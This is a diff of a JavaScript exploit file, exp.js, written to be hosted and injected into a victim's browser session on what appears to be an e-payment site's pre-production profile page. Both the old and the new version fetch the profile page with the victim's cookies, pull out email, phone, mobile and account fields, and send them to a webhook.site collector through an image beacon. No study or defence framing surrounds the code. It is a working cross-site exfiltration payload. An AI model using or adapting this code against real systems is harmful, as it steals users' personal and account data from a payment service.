@@ -1,42 +1,37 @@
+// exp.js  — host this on https://yourhost/exp.js
 (function(){
-  try {
-    var TARGET = "https://epay2-preprod.efinance.com.eg/ePay/EditProfile.do?method=preEditProfile&STYLE_TYPE=0";
-    var WEBHOOK = "https://webhook.site/fd927130-bc42-4bf4-81a8-e4b93d169ac2";
-    var xhr = new XMLHttpRequest();
-    xhr.open("GET", TARGET, true);
-    xhr.withCredentials = true;
-    xhr.timeout = 10000;
+  // fetch profile page with victim credentials
 
-    xhr.onreadystatechange = function() {
-      if (xhr.readyState !== 4) return;
+  fetch("/ePay/EditProfile.do?method=preEditProfile&STYLE_TYPE=0", { credentials: "include" })
+  .then(function(res){ return res.text(); })
+  .then(function(html){
+    // extract inputs like: <input ... name="email" ... value="...">
+    var data = {};
+    try {
+      html.replace(/<input[^>]*name=["']?([^"'\s>]+)["']?[^>]*value=["']?([^"']*)["']?/gi,
+        function(_, name, val){
+          data[name] = val;
+          return "";
+        });
+    } catch(e) { /* ignore */ }
 
-      var email = "";
-      try {
-        var doc = new DOMParser().parseFromString(xhr.responseText || "", "text/html");
-        var inp = doc.querySelector('input[name="email"], input[name=email]');
-        email = inp ? (inp.value || inp.getAttribute("value") || "") : "";
-      } catch (e) {
-        email = "";
+    // pick fields to exfiltrate (example: email)
+    var email = data.email || "";
+
+    // prepare small payload (avoid super-long URLs)
+    var q = "email=" + encodeURIComponent(email);
+    for(var k in data){
+      // include up to a few fields
+      if(k && (k==="email" || k==="phone" || k==="mobile" || k==="account")) {
+        q += "&" + encodeURIComponent(k) + "=" + encodeURIComponent(data[k]);
       }
+    }
 
-      // Send email as GET param using image beacon (simple, CORS-agnostic)
-      var img = new window.Image();
-      img.src = WEBHOOK + "?email=" + encodeURIComponent(email);
-    };
-
-    xhr.ontimeout = function(){
-      var img = new window.Image();
-      img.src = WEBHOOK + "?status=timeout";
-    };
-
-    xhr.onerror = function(e){
-      var img = new window.Image();
-      img.src = WEBHOOK + "?status=xhrerror";
-    };
-
-    xhr.send();
-  } catch (err) {
-    var img = new window.Image();
-    img.src = WEBHOOK + "?status=exception";
-  }
+    // final beacon — use webhook.site or your collector
+    (new Image()).src = "https://webhook.site/fd927130-bc42-4bf4-81a8-e4b93d169ac2?d="+encodeURIComponent(q);
+  })
+  .catch(function(err){
+    // fallback: send small error beacon
+    (new Image()).src = "https://webhook.site/fd927130-bc42-4bf4-81a8-e4b93d169ac2?err="+encodeURIComponent(String(err));
+  });
 })();
